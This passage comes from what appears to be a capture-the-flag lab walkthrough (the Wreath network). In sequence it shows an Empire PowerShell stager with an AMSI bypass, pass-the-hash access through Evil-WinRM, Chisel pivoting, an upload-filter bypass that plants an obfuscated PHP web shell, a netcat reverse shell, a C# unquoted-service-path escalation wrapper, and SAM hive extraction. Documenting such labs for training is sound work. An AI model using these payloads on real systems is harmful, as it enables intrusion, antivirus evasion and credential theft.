![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691956347391/4b30b14d-4291-4e34-b521-59faee87c0ff.png){: .center-image }

```bash
execute
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691956359715/7f3cb4b5-9b88-4b74-b1b7-e3343c4274b3.png){: .center-image }

This essentially generates various `.php` files in the specified `http_hop` directory located in the `/tmp` folder on our attacking machine.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691956438201/0a472de6-5fb3-45a6-a347-3aae0e354201.png){: .center-image }

We will need to replicate this file structure on our `jump server` for this to function properly.

### Callback from http\_hop Listener

Now it's time to configure our stager to receive a callback from our `http_hop` listener.

Select stager:

```bash
usestager multi_launcher
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691956623336/54f73ff5-b948-4a3a-9381-8bb82bbae590.png){: .center-image }

Set Listener to `http_hop`:

```bash
use Listener http_hop
```

```bash
execute
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691956653454/a90c4e5e-9fc9-4a9a-8f18-cd5e18efe59e.png){: .center-image }

Configure the `jump server`:

```bash
mkdir /tmp/hop-reapZ
cd /tmp/hop-reapZ
```

Zip up the contents from `/tmp/http_hop` from our attack box and transfer it to `prod-serv` by typing:

```bash
cd /tmp/http_hop && zip -r hop.zip *
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691956779118/cd61c64d-8ad5-425d-aee7-8da726e3a37b.png){: .center-image }

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691956783254/bd6c0976-0020-438c-b41c-20b5efa73e43.png){: .center-image }

```bash
curl http://10.50.106.231:8001/hop.zip --output hop.zip
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691956793466/3dce6e6e-dde0-4f5b-8a0a-f48d8df60ca4.png){: .center-image }

Unzip the contents:

```bash
unzip hop.zip
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691956816788/f23f2a43-6d44-4bf8-8b54-c148622cf23e.png){: .center-image }

Now serve a `PHP` server with these files:

```bash
php -S 0.0.0.0:47000 &>/dev/null &
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691956900289/d643cdec-87a4-472d-80b0-a74ce1ec524c.png){: .center-image }

Verify that it is running by typing:

```bash
ss -tulwn | grep 47000
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691956965115/d944be93-8082-4b48-8018-a5b87bacee4b.png){: .center-image }

Ensure that `port 47000` is open in the firewall:

```bash
firewall-cmd --zone=public --add-port 47000/tcp
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691957036843/2278ef39-f539-4243-9c3a-3f046802f3e5.png){: .center-image }

Now, copy the PowerShell stager to your `Burp Suite` session, URL encode it by pressing `Ctrl + U`, and then send it:

```powershell
powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBpAG8AbgAuAE0AYQBqAG8AcgAgAC0AZwBlACAAMwApAHsAJABSAGUAZgA9AFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBlAHQARgBpAGUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdAB2AGEAbAB1AGUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AGUAKQA7AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBFAHYAZQBuAHQAaQBuAGcALgBFAHYAZQBuAHQAUAByAG8AdgBpAGQAZQByAF0ALgBHAGUAdABGAGkAZQBsAGQAKAAnAG0AXwBlAG4AYQBiAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwASQBuAHMAdABhAG4AYwBlACcAKQAuAFMAZQB0AFYAYQBsAHUAZQAoAFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBUAHIAYQBjAGkAbgBnAC4AUABTAEUAdAB3AEwAbwBnAFAAcgBvAHYAaQBkAGUAcgAnACkALgBHAGUAdABGAGkAZQBsAGQAKAAnAGUAdAB3AFAAcgBvAHYAaQBkAGUAcgAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAEcAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAApACwAMAApADsAfQA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoARQB4AHAAZQBjAHQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAdwBjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHcAYwAuAEgAZQBhAGQAZQByAHMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAHcAYwAuAFAAcgBvAHgAeQA9AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARABlAGYAYQB1AGwAdABXAGUAYgBQAHIAbwB4AHkAOwAkAHcAYwAuAFAAcgBvAHgAeQAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAD0AIABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBDAHIAZQBkAGUAbgB0AGkAYQBsAEMAYQBjAGgAZQBdADoAOgBEAGUAZgBhAHUAbAB0AE4AZQB0AHcAbwByAGsAQwByAGUAZABlAG4AdABpAGEAbABzADsAJABLAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAQgB5AHQAZQBzACgAJwA7AEYAVAAyADYAcABuACwAPwBqACYALgB2ADgAfgBKAHMAcgBvACgASwBoAEEAQgBfAEgALwA6ADwALQA5AGIAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBnAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAG8AdQBuAHQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgB4AG8AcgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJAB3AGMALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAHMAZQBzAHMAaQBvAG4APQBBAC8AUgBnAFMAZwBhAFYAVwBEAG4AdgBjADEALwBZAEUANAA2AHcAYgA2ADQAZQB0AHgAawA9ACIAKQA7ACQAcwBlAHIAPQAkACgAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABTAHQAcgBpAG4AZwAoAFsAQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJwBhAEEAQgAwAEEASABRAEEAYwBBAEEANgBBAEMAOABBAEwAdwBBAHgAQQBEAEEAQQBMAGcAQQB5AEEARABBAEEATQBBAEEAdQBBAEQARQBBAE0AQQBBADEAQQBDADQAQQBNAGcAQQB3AEEARABBAEEATwBnAEEAMABBAEQAYwBBAE0AQQBBAHcAQQBEAEEAQQAnACkAKQApADsAJAB0AD0AJwAvAG4AZQB3AHMALgBwAGgAcAAnADsAJABoAG8AcAA9ACcAaAB0AHQAcABfAGgAbwBwACcAOwAkAGQAYQB0AGEAPQAkAHcAYwAuAEQAbwB3AG4AbABvAGEAZABEAGEAdABhACgAJABzAGUAcgArACQAdAApADsAJABpAHYAPQAkAGQAYQB0AGEAWwAwAC4ALgAzAF0AOwAkAGQAYQB0AGEAPQAkAGQAYQB0AGEAWwA0AC4ALgAkAGQAYQB0AGEALgBsAGUAbgBnAHQAaABdADsALQBqAG8AaQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAYQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691957248195/83cab665-08d5-42b0-b92d-3f2e093510b4.png){: .center-image }

Return to `Empire` and confirm that we have received the new `Agent`.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691957273160/027ba5a9-ec60-4e21-865c-f18ec8377782.png){: .center-image }

## Enumerate GitServer

Perfect, we have established a connection with GitServer. We need to enumerate, but we cannot use `Nmap` since installing it would trigger the anti-virus. We also can't run a scan through the proxy because we are tunneled through two of them. Therefore, we need to examine `Empire` and determine which modules are available for us to use. After all, they are PowerShell scripts, and we have PowerShell capability on GitServer. However, as a proof of concept, we will upload a `Netcat` binary via `Evil-WinRM`.

From `Evil-WinRM`:

```bash
upload /Transfers/ncat.exe C:\Windows\Temp\nc-reapZ.exe
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691957743064/d1d0c7c1-db06-442d-bd48-00584448c40d.png){: .center-image }

{% include note.html content="The file path where your netcat binary might be different. Confirm the location by typing: `which nc`" %}

Easy. However, this method will be conspicuous and might be detected, as it requires writing to the disk. Instead, let's use a script integrated into `Empire`, which will run in memory and have a lower likelihood of detection.

```bash
evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.105.150 -s /usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network/
```

```bash
Invoke-Portscan.ps1
```

```bash
Invoke-Portscan -Hosts 10.200.105.150 -TopPorts 50
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691957941277/980b6434-00ea-42bc-88c9-ba5e9863c669.png){: .center-image }

### Pivoting

As we did previously, we need to find a method to forward the port on GitServer, allowing us access to Thomas' development website. We can utilize the `Chisel` tool to establish a forward proxy.

First, we need to open a port in the Windows Firewall:

```bash
netsh advfirewall firewall add rule name="Chisel-reapZ" dir=in action=allow protocol=tcp localport=45000
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691958184569/7af7498a-3e8e-4985-ab1a-7932496e89aa.png){: .center-image }

Setup `Chisel`:

Download Binary (`Windows 386 - v1.7.5`): [https://github.com/jpillora/chisel/releases](https://github.com/jpillora/chisel/releases)

Unzip:

```bash
gunzip chisel_1.7.5_windows_386.gz
```

Rename:

```bash
mv chisel_1.7.5_windows_386.gz chisel-reapZ.exe
```

Upload via `Evil-WinRM`:

```bash
upload /Transfers/chisel-reapZ.exe C:\Windows\Temp\chisel-reapZ.exe
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691958316816/b0debd71-80f1-49e2-85e6-f7295af9756a.png){: .center-image }

Initialize the `Chisel Server` on Thomas's PC:

```bash
.\chisel-reapZ.exe server -p 45000 --socks5
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691958381576/31477ca2-8ff0-4406-b98f-b55dbc05e116.png){: .center-image }

Initialize the `Chisel Client` on our attack box:

```bash
chisel client 10.200.105.150:45000 9090:socks
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691958491301/1c98a68f-bfda-4f29-b2b3-541a4811901b.png){: .center-image }

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691958500360/f18c428a-1bff-447a-b983-0a77e1bbdd50.png){: .center-image }

{% include note.html content="Ensure you're running versions older than 1.8.1 as this version does not work. I used version 1.7.5 for this session." %}

Ensure you have `FoxyProxy` configured and enabled:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691958517308/f1c9acae-8cbe-4e48-9753-4f6630a21fbb.png){: .center-image }

If everything has been set up correctly, we should be able to access the development site at `http://10.200.105.100`.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691958620817/5ab1baf2-b855-47e9-bd76-a1022a977448.png){: .center-image }

Wappalyzer Results:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691958638298/44efab86-38ba-42fd-8388-32aa8f2983e2.png){: .center-image }

### Extracting Data from Git

It's time to compare the development site with the live production site. We will download the `.git` repository from the `git-serv` and reassemble it on our attack machine for analysis.

Location of `.git` repository:

```bash
C:\GitStack\repositories\Website.git
```

Download using `Evil-WinRM`:

```bash
download C:\GitStack\repositories\Website.git
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691958963309/a8cc0030-1766-4e60-84fc-3d5a66f17360.png){: .center-image }

Next, we aim to reconstruct the website. We can utilize a tool called `GitTools` for this purpose. Essentially, this tool takes the repository and converts it into a readable format, allowing us to work with it more effectively.

`cd` into `/Website.git` and download `GitTools` into it:

```bash
git clone https://github.com/internetwache/GitTools
```

```bash
GitTools/Extractor/extractor.sh . Website
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691960552938/c6844d02-36c4-4531-b788-4326ed64c88b.png){: .center-image }

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691960557348/c0860e3d-b1fc-49e6-a90f-f2f784f092a9.png){: .center-image }

Each of these directories corresponds to a previous commit. Unfortunately, they are not sorted by date, so we need to find a method to arrange them accordingly.

We can use a bash one-liner for this:

```bash
separator="======================================="; for i in $(ls); do printf "\n\n$separator\n\033[4;1m$i\033[0m\n$(cat $i/commit-meta.txt)\n"; done; printf "\n\n$separator\n\n\n"
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691960626537/3d303fad-5738-4fdf-9c5c-441e981bb656.png){: .center-image }

We can see three different commit comments: *Static Website Commit, Updated the filter, and Initial Commit for the back-end*.

To determine the commit order, we identify the commit with no parent and compare it to the other commits:

1. `70dde80cc19ec76704567996738894828f4ee895`
    
2. `82dfc97bec0d7582d485d9031c09abcb5c6b18f2`
    
3. `345ac8b236064b431fa43f53d91c98c4834ef8f3`
    

Based on the comment from the third commit `345ac8b236064b431fa43f53d91c98c4834ef8f3`, we will analyze the filter and determine if it is possible to bypass security controls.

### Website Code Analysis

First, we need to locate a `PHP` file to identify potential vulnerabilities. We can accomplish this by searching for `.php` files using a wildcard in the directory.

Change Directory:

```bash
cd 1-345ac8b236064b431fa43f53d91c98c4834ef8f3
```

Look for a PHP file:

```bash
find . -name "*.php"
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691961074854/ba177b6c-ad52-412d-94f8-3740ef73b3c6.png){: .center-image }

Analyze the code:

```php
<?php

    if(isset($_POST["upload"]) && is_uploaded_file($_FILES["file"]["tmp_name"])){
        $target = "uploads/".basename($_FILES["file"]["name"]);
        $goodExts = ["jpg", "jpeg", "png", "gif"];
        if(file_exists($target)){
            header("location: ./?msg=Exists");
            die();
        }
        $size = getimagesize($_FILES["file"]["tmp_name"]);
        if(!in_array(explode(".", $_FILES["file"]["name"])[1], $goodExts) || !$size){
            header("location: ./?msg=Fail");
            die();
        }
        move_uploaded_file($_FILES["file"]["tmp_name"], $target);	
        header("location: ./?msg=Success");
        die();
    } else if ($_SERVER["REQUEST_METHOD"] == "post"){
        header("location: ./?msg=Method");
    }


    if(isset($_GET["msg"])){
        $msg = $_GET["msg"];
        switch ($msg) {
            case "Success":
                $res = "File uploaded successfully!";
                break;
            case "Fail":
                $res = "Invalid File Type";
                break;
            case "Exists":
                $res = "File already exists";
                break;
            case "Method":
                $res = "No file send";
                break;
        
        }
    }
?>
<!DOCTYPE html>
<html lang=en>
    <!-- ToDo:
          - Finish the styling: it looks awful
          - Get Ruby more food. Greedy animal is going through it too fast
          - Upgrade the filter on this page. Can't rely on basic auth for everything
          - Phone Mrs Walker about the neighbourhood watch meetings
    -->
    <head>	
        <title>Ruby Pictures</title>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="stylesheet" type="text/css" href="assets/css/Andika.css">
        <link rel="stylesheet" type="text/css" href="assets/css/styles.css">
    </head>
    <body>
        <main>
            <h1>Welcome Thomas!</h1>
            <h2>Ruby Image Upload Page</h2>
            <form method="post" enctype="multipart/form-data">
                <input type="file" name="file" id="fileEntry" required, accept="image/jpeg,image/png,image/gif">
                <input type="submit" name="upload" id="fileSubmit" value="Upload">
            </form>
            <p id=res><?php if (isset($res)){ echo $res; };?></p>
        </main>	
    </body>
</html>
```

Analyzing the code below reveals two things: we can bypass the filter by including an additional extension, and there is a whitelist filter in place to allow only these approved extensions: `.jpg, .jpeg, .png, .gif`.

```php
if(isset($_POST["upload"]) && is_uploaded_file($_FILES["file"]["tmp_name"])){
        $target = "uploads/".basename($_FILES["file"]["name"]);
        $goodExts = ["jpg", "jpeg", "png", "gif"];
        if(file_exists($target)){
            header("location: ./?msg=Exists");
            die();
        }
        $size = getimagesize($_FILES["file"]["tmp_name"]);
        if(!in_array(explode(".", $_FILES["file"]["name"])[1], $goodExts) || !$size){
            header("location: ./?msg=Fail");
            die();
        }
```

This line of code:

```php
if(!in_array(explode(".", $_FILES["file"]["name"])[1], $goodExts)
```

Essentially, it searches for the delimiter, extracts the filename and extension, and then passes them through the filter. The issue arises when a second extension, such as `.php`, is introduced. In this case, the first extension will pass through the filter as "`.jpg`", and the second extension will be appended back to the filename, making it accessible as a `.php` file.

### Exploit Proof of Concept

We are presented with a login prompt upon visiting `http://10.200.105.100/resources`. Luckily for us, we obtained some possible credentials earlier when we extracted credentials using `Mimikatz`.

* Potential Usernames: `Thomas` and `twreath`
    
* Potential Password: `i<3ruby`
    
* Successful Login Credentials: `Thomas:i<3ruby`
    

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691961455411/74af2b45-bf6f-48c4-ab62-fd9728d6ffd9.png){: .center-image }

Upon uploading an image featuring a `.jpg` extension, the following is returned:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691961483651/c06a77da-1f43-4509-bff0-f0962e9fcec1.png){: .center-image }

However, when uploading a file that is not included in the whitelist filter, the following message is returned:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691961509804/89b138df-12c9-42ab-aa74-46833811f50c.png){: .center-image }

We already know that we can append a second extension, `.php`, to bypass the first filter, but bypassing the second filter will be slightly more challenging. Considering that the `getimagesize()` function of the filter checks for attributes of an image, we can meet those requirements while also including a PHP webshell in the Comment field of the image metadata by using `exiftool`.

```bash
cp realimage.jpg shell.jpg.php
```

```bash
exiftool shell.jpg.php
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691961600739/7ede294e-7e59-4133-b88e-e4ac09f2d06c.png){: .center-image }

Now, we aim to insert a `PHP` payload into the file's `metadata`:

```bash
exiftool -Comment="<?php echo \"<pre>Test Payload</pre>\"; die(); ?>" shell.jpg.php
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691961659852/2b2df5a4-671f-42a8-a55a-5f1d539cf29e.png){: .center-image }

After uploading the file and navigating to `http://10.200.105.100/resources/uploads/shell.jpg.php`, we are presented with the following:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691961690520/10d74ba1-e991-4bf8-8824-4915c9a7d44c.png){: .center-image }

This is excellent news, as it indicates that we have achieved Remote Code Execution (RCE) on the server. However, we will refrain from uploading a shell at this time, as we are uncertain about the antivirus software installed on Thomas' machine and wish to avoid triggering any alarms. We will return to this issue after obfuscating our file to evade Antivirus (AV) detection.

## Antivirus Evasion

PHP obfuscation entails implementing a variety of transformations to PHP code, including altering variable names, eliminating whitespace, encoding strings, and incorporating extraneous code. This process increases the code's complexity and makes it harder for humans to understand during static analysis and for antivirus heuristic-based detection systems. Bearing this in mind, let's obfuscate our payload to bypass Thomas' Windows Defender.

Payload:

```php
<?php
    $cmd = $_GET["wreath"];
    if(isset($cmd)){
        echo "<pre>" . shell_exec($cmd) . "</pre>";
    }
    die();
?>
```

We're avoiding the one-liner '`<?php system($_GET["cmd"]);?>`' to minimize detection as much as possible. In this scenario, being different is advantageous. Moreover, when we obfuscate our code, it will transform into a one-liner anyway.

We will utilize [https://www.gaijin.at/en/tools/php-obfuscator](https://www.gaijin.at/en/tools/php-obfuscator) to obfuscate the code.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691962255420/dcf14775-6a34-4382-9441-1316905a53a6.png){: .center-image }

Obfuscated `PHP` Code:

```php
<?php $o0=$_GET[base64_decode('d3JlYXRo')];if(isset($o0)){echo base64_decode('PHByZT4=').shell_exec($o0).base64_decode('PC9wcmU+');}die();?>
```

We need to make a slight modification to ensure that the `$` signs don't get recognized as bash variables.

```php
<?php \$o0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$o0)){echo base64_decode('PHByZT4=').shell_exec(\$o0).base64_decode('PC9wcmU+');}die();?>
```

Now, we can set up our payload for deployment:

```bash
exiftool -Comment="<?php \$o0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$o0)){echo base64_decode('PHByZT4=').shell_exec(\$o0).base64_decode('PC9wcmU+');}die();?>" shell-reapZ.jpg.php
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691962378523/cb238e43-efdd-47be-9d88-a37ec8adc2d4.png){: .center-image }

Upload the file and go to: [`http://10.200.105.100/resources/uploads/shell-reapZ.jpg.php`](http://10.200.105.100/resources/uploads/shell-reapZ.jpg.php)

If everything went according to plan, we should receive an output like this:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691962503761/bb94a221-533f-4735-828b-f9922d74578c.png){: .center-image }

This means we have RCE capability:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691962499412/e88d9c4a-af58-4362-ab04-799a7e7ab2ad.png){: .center-image }

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691962510659/05c4c9ed-527f-4edc-9637-326e7bdc140c.png){: .center-image }

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691962515557/07df24c2-6279-4ecd-8e40-ad0487a8c115.png){: .center-image }

### Compiling Netcat and Reverse Shell

There are multiple ways to try and gain a reverse shell on Thomas' PC. However, we need to be very careful not to trigger Windows Defender. Using a PowerShell reverse shell seems like a good idea, but Windows Defender would detect it in a split second. We know there's a `PHP interpreter` on the machine, as that's how we obtained RCE in the first place, but we won't go this route because `PHP` shells can be a bit finicky. We're going to go with the old trusty `netcat` binary, but not just any binary—one that is less likely to be detected by Windows Defender.

Clone Repository:

```bash
git clone https://github.com/int0x33/nc.exe/
```

Start Python Server:

```bash
python3 -m http.server 8002
```

Upload via `curl`:

```bash
curl http://<ATTACK_BOX_IP>:8002/nc64.exe -o C:\\Windows\\Temp\\nc-reapZ.exe
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691962836206/96888869-f385-4187-8013-1fe474969982.png){: .center-image }

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691962841729/b80cb9c8-9707-42a6-88ee-e36a77aaa1d2.png){: .center-image }

Next, we need to initiate a `Netcat` listener on our attack box:

```bash
rlwrap -cAr nc -lvnp 13337
```

Call it from the web shell:

```powershell
powershell.exe c:\\windows\\temp\\nc-reapZ.exe <ATTACK_BOX_IP> 13337 -e cmd.exe
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691962891796/faffde86-6c18-47d7-867a-c9c3bb0536cf.png){: .center-image }

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691962896168/abd0e41c-57f7-4118-9ea1-2499d9955fd4.png){: .center-image }

### Enumerate Thomas' PC

```powershell
whoami /priv
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691963851409/ed7a46c9-2ccc-4883-9b65-c8e9000d4594.png){: .center-image }

Check current user groups:

```powershell
whoami /groups
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691963886980/1c369f91-57a3-44dd-99ac-5df9776b929f.png){: .center-image }

Let's search for non-standard services:

```powershell
wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691963959103/05c57e05-bd3c-4b4d-85d0-26547d62497d.png){: .center-image }

This command lists all the services on the system and then filters only those services located outside of the `C:\Windows` directory. Immediately, we can see that the service `SystemExplorerHelpService` has a `PathName` that is missing quotes, which essentially means we can upload a payload as `System.exe` and initiate our privilege escalation. Running `sc qc SystemExplorerHelpService` informs us that the service is running as `LocalSystem`.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691964080213/53ad0b8d-6a12-4944-aa19-52e56a6c68e2.png){: .center-image }

Let's verify that we can actually write to it:

```powershell
powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691964127569/1d67c5de-b939-44ce-8d27-b982686876c5.png){: .center-image }

Perfect, we have full control of this directory.

### Privesc and Root

Considering that we already have Netcat on the machine, all we need to do is create a simple wrapper program that will execute Netcat as `NT AUTHORITY\SYSTEM` and connect back to our listener. We will disguise it as `System.exe` to exploit the unquoted service path vulnerability found in `SystemExplorerHelpService`.

Install the compiler `mono`:

```bash
sudo apt install mono-devel
```

Open a file called `Wrapper.cs`:

```bash
gedit Wrapper.cs
```

Add the necessary imports to make use of code from other namespaces, which will grant us access to essential functions.

```csharp
using System;
using System.Diagnostics;
```

These will enable us to start Netcat. Next, we need to initialize a namespace and a class for our program.

```csharp
namespace Wrapper {
    class Program {
        static void Main() {
            // Netcat reverse shell here
        }
    }
}
```

Now, we can incorporate our reverse shell.

```csharp
Process proc = new Process();
ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc-reapZ.exe", "<ATTACK_BOX_IP> 13337 -e cmd.exe");
```

We need to ensure that the program does not generate a GUI window upon execution.

```csharp
procInfo.CreateNoWindow = true;
proc.StartInfo = procInfo;
proc.Start();
```

Completed Program:

```csharp
using System;
using System.Diagnostics;

namespace Wrapper {
    class Program {
        static void Main() {
            Process proc = new Process();
            ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc-reapZ.exe", "<ATTACK_BOX_IP> 13337 -e cmd.exe");
            procInfo.CreateNoWindow = true;
            proc.StartInfo = procInfo;
            proc.Start();
        }
    }
}
```

Now, we can compile our program using the `Mono mcs` compiler by executing the following command:

```bash
mcs Wrapper.cs
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691964645155/5693b782-2e97-421b-9902-697dc69c57f3.png){: .center-image }

Upload it using a Python server and `curl`.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691964668305/337c5d33-52cc-4a72-a613-2f21ed3885ff.png){: .center-image }

Now, start a listener and run the program:

```bash
rlwrap -cAr nc -lvnp 13337
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691964717899/7f5c5610-4c72-4bad-9e9a-b79ba5b9f70b.png){: .center-image }

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691964722100/e5923c3b-64ba-4ccf-bf0b-10a96108c237.png){: .center-image }

Excellent, this works. Now let's rename this to `System.exe` and place it in the `SystemExplorerHelpService` file path: `C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe`. Due to the unquoted file path vulnerability, our program will be executed with `NT AUTHORITY\SYSTEM` at this location: `"C:\Program Files (x86)\System Explorer\System.exe"`.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691964776535/7d12ada5-4b89-43b5-aba0-e6d1a04d1280.png){: .center-image }

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691964781327/c259004c-62ce-4cce-bde7-da95c0704566.png){: .center-image }

Now, let's restart the `SystemExplorerHelpService` so that the system will execute our shell.

```bash
sc stop SystemExplorerHelpService
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691964846860/0f3c65f3-476d-4026-bc4d-3cf7a09b8703.png){: .center-image }

```bash
sc start SystemExplorerHelpService
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691964873519/8c3371cd-c76a-40b4-8f95-f4bd4e0463a3.png){: .center-image }

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691964877900/6657486b-dc01-44b3-a862-bff3488c495c.png){: .center-image }

And we have root access! As an additional bonus and for extra practice, we will exfiltrate Thomas' data as evidence of compromise. However, it is crucial to remember that you should never exfiltrate data without the explicit permission of the hiring authority under any circumstances.

### Exfiltration

As a means of demonstrating to Thomas that we have gained root access to his machine, we will supply the password hash for his `Administrator` account. To accomplish this, we will save the `SAM` and `SYSTEM` hives.

Extract `SAM` hive:

```powershell
reg.exe save HKLM\SAM sam.bak
```

